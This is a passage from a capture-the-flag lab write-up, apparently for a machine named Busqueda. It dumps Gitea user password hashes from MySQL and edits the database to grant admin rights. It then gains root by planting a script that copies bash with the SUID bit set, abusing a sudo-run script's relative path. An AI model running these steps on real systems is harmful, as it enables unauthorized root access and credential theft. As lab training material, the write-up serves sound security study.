| package                   |
| package_blob              |
| package_blob_upload       |
| package_file              |
| package_property          |
| package_version           |
| project                   |
| project_board             |
| project_issue             |
| protected_branch          |
| protected_tag             |
| public_key                |
| pull_auto_merge           |
| pull_request              |
| push_mirror               |
| reaction                  |
| release                   |
| renamed_branch            |
| repo_archiver             |
| repo_indexer_status       |
| repo_redirect             |
| repo_topic                |
| repo_transfer             |
| repo_unit                 |
| repository                |
| review                    |
| review_state              |
| session                   |
| star                      |
| stopwatch                 |
| system_setting            |
| task                      |
| team                      |
| team_invite               |
| team_repo                 |
| team_unit                 |
| team_user                 |
| topic                     |
| tracked_time              |
| two_factor                |
| upload                    |
| user                      |
| user_badge                |
| user_open_id              |
| user_redirect             |
| user_setting              |
| version                   |
| watch                     |
| webauthn_credential       |
| webhook                   |
+---------------------------+
91 rows in set (0.00 sec)
```

```c
mysql> SELECT * FROM user;
+----+---------------+---------------+-----------+----------------------------------+--------------------+--------------------------------+------------------------------------------------------------------------------------------------------+------------------+----------------------+------------+--------------+------------+------+----------+---------+----------------------------------+----------------------------------+----------+-------------+--------------+--------------+-----------------+----------------------+-------------------+-----------+----------+---------------+----------------+--------------------+---------------------------+----------------+--------+----------------------------------+-------------------+---------------+---------------+-----------+-----------+-----------+-------------+------------+-------------------------------+-----------------+-------+-----------------------+
| id | lower_name    | name          | full_name | email                            | keep_email_private | email_notifications_preference | passwd                                                                                               | passwd_hash_algo | must_change_password | login_type | login_source | login_name | type | location | website | rands                            | salt                             | language | description | created_unix | updated_unix | last_login_unix | last_repo_visibility | max_repo_creation | is_active | is_admin | is_restricted | allow_git_hook | allow_import_local | allow_create_organization | prohibit_login | avatar | avatar_email                     | use_custom_avatar | num_followers | num_following | num_stars | num_repos | num_teams | num_members | visibility | repo_admin_change_team_access | diff_view_style | theme | keep_activity_private |
+----+---------------+---------------+-----------+----------------------------------+--------------------+--------------------------------+------------------------------------------------------------------------------------------------------+------------------+----------------------+------------+--------------+------------+------+----------+---------+----------------------------------+----------------------------------+----------+-------------+--------------+--------------+-----------------+----------------------+-------------------+-----------+----------+---------------+----------------+--------------------+---------------------------+----------------+--------+----------------------------------+-------------------+---------------+---------------+-----------+-----------+-----------+-------------+------------+-------------------------------+-----------------+-------+-----------------------+
|  1 | administrator | administrator |           | administrator@gitea.searcher.htb |                  0 | enabled                        | ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2 | pbkdf2           |                    0 |          0 |            0 |            |    0 |          |         | 44748ed806accc9d96bf9f495979b742 | a378d3f64143b284f104c926b8b49dfb | en-US    |             |   1672857920 |   1680531979 |      1673083022 |                    1 |                -1 |         1 |        1 |             0 |              0 |                  0 |                         1 |              0 |        | administrator@gitea.searcher.htb |                 0 |             0 |             0 |         0 |         1 |         0 |           0 |          0 |                             0 |                 | auto  |                     0 |
|  2 | cody          | cody          |           | cody@gitea.searcher.htb          |                  0 | enabled                        | b1f895e8efe070e184e5539bc5d93b362b246db67f3a2b6992f37888cb778e844c0017da8fe89dd784be35da9a337609e82e | pbkdf2           |                    0 |          0 |            0 |            |    0 |          |         | 304b5a2ce88b6d989ea5fae74cc6b3f3 | d1db0a75a18e50de754be2aafcad5533 | en-US    |             |   1672858006 |   1680532283 |      1680532243 |                    1 |                -1 |         1 |        0 |             0 |              0 |                  0 |                         1 |              0 |        | cody@gitea.searcher.htb          |                 0 |             0 |             0 |         0 |         1 |         0 |           0 |          0 |                             0 |                 | auto  |                     0 |
+----+---------------+---------------+-----------+----------------------------------+--------------------+--------------------------------+------------------------------------------------------------------------------------------------------+------------------+----------------------+------------+--------------+------------+------+----------+---------+----------------------------------+----------------------------------+----------+-------------+--------------+--------------+-----------------+----------------------+-------------------+-----------+----------+---------------+----------------+--------------------+---------------------------+----------------+--------+----------------------------------+-------------------+---------------+---------------+-----------+-----------+-----------+-------------+------------+-------------------------------+-----------------+-------+-----------------------+
2 rows in set (0.00 sec)
```

```c
mysql> SELECT name,email,passwd FROM user;
+---------------+----------------------------------+------------------------------------------------------------------------------------------------------+
| name          | email                            | passwd                                                                                               |
+---------------+----------------------------------+------------------------------------------------------------------------------------------------------+
| administrator | administrator@gitea.searcher.htb | ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2 |
| cody          | cody@gitea.searcher.htb          | b1f895e8efe070e184e5539bc5d93b362b246db67f3a2b6992f37888cb778e844c0017da8fe89dd784be35da9a337609e82e |
+---------------+----------------------------------+------------------------------------------------------------------------------------------------------+
2 rows in set (0.00 sec)
```

### Gitea Privilege Escalation by Updating MySQL Database Set

```c
mysql> UPDATE gitea.user SET is_admin = 1 WHERE name = "cody";
Query OK, 1 row affected (0.00 sec)
Rows matched: 1  Changed: 1  Warnings: 0
```

### Enumerating private Repository of Administrator

> http://127.0.0.1:3000/administrator

> http://127.0.0.1:3000/administrator/scripts

The point of interest was the `system-checkup.sh` script which was missing a full path for execution.

> http://127.0.0.1:3000/administrator/scripts/src/branch/main/system-checkup.py

```c
#!/bin/bash
import subprocess
import sys

actions = ['full-checkup', 'docker-ps','docker-inspect']

def run_command(arg_list):
    r = subprocess.run(arg_list, capture_output=True)
    if r.stderr:
        output = r.stderr.decode()
    else:
        output = r.stdout.decode()

    return output


def process_action(action):
    if action == 'docker-inspect':
        try:
            _format = sys.argv[2]
            if len(_format) == 0:
                print(f"Format can't be empty")
                exit(1)
            container = sys.argv[3]
            arg_list = ['docker', 'inspect', '--format', _format, container]
            print(run_command(arg_list)) 
        
        except IndexError:
            print(f"Usage: {sys.argv[0]} docker-inspect <format> <container_name>")
            exit(1)
    
        except Exception as e:
            print('Something went wrong')
            exit(1)
    
    elif action == 'docker-ps':
        try:
            arg_list = ['docker', 'ps']
            print(run_command(arg_list)) 
        
        except:
            print('Something went wrong')
            exit(1)

    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
            

if __name__ == '__main__':

    try:
        action = sys.argv[1]
        if action in actions:
            process_action(action)
        else:
            raise IndexError

    except IndexError:
        print(f'Usage: {sys.argv[0]} <action> (arg1) (arg2)')
        print('')
        print('     docker-ps     : List running docker containers')
        print('     docker-inspect : Inpect a certain docker container')
        print('     full-checkup  : Run a full system checkup')
        print('')
        exit(1)

```
There was the vulnerability.

```c
    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
```

### Privilege Escalation by creating a malicious full-checkup.sh

```c
svc@busqueda:~$ pwd
/home/svc
```

```c
svc@busqueda:~$ echo '#!/bin/bash' > full-checkup.sh; echo 'cp /bin/bash /tmp/; chmod +s /tmp/bash' >> full-checkup.sh; chmod +x full-checkup.sh
```

```c
svc@busqueda:~$ cat full-checkup.sh 
#!/bin/bash
cp /bin/bash /tmp/; chmod +s /tmp/bash
```

```c
svc@busqueda:~$ ls -la
total 48
drwxr-x--- 5 svc  svc  4096 Apr 13 09:52 .
drwxr-xr-x 3 root root 4096 Dec 22 18:56 ..
lrwxrwxrwx 1 root root    9 Feb 20 12:08 .bash_history -> /dev/null
-rw-r--r-- 1 svc  svc   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 svc  svc  3771 Jan  6  2022 .bashrc
drwx------ 2 svc  svc  4096 Feb 28 11:37 .cache
-rwxr-xr-x 1 svc  svc    51 Apr 13 09:52 full-checkup.sh
-rw-rw-r-- 1 svc  svc    76 Apr  3 08:58 .gitconfig
-rw------- 1 svc  svc    20 Apr 13 09:18 .lesshst
drwxrwxr-x 5 svc  svc  4096 Jun 15  2022 .local
lrwxrwxrwx 1 root root    9 Apr  3 08:58 .mysql_history -> /dev/null
-rw-r--r-- 1 svc  svc   807 Jan  6  2022 .profile
lrwxrwxrwx 1 root root    9 Feb 20 14:08 .searchor-history.json -> /dev/null
drwxr-xr-x 2 svc  svc  4096 Apr 13 09:22 .ssh
-rw-r----- 1 root svc    33 Apr 13 08:33 user.txt
```

```c
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup

[+] Done!
```

```c
svc@busqueda:~$ ls -la /tmp
total 1420
drwxrwxrwt 14 root root    4096 Apr 13 09:53 .
drwxr-xr-x 19 root root    4096 Mar  1 10:46 ..
-rwsr-sr-x  1 root root 1396520 Apr 13 09:53 bash
```

```c
svc@busqueda:~$ /tmp/bash -p
bash-5.1#
```

```c
bash-5.1# id
uid=1000(svc) gid=1000(svc) euid=0(root) egid=0(root) groups=0(root)
```

## root.txt

```c
bash-5.1# cat /root/root.txt
6a52e1f0ec3532edccc9616b98cd910d
```
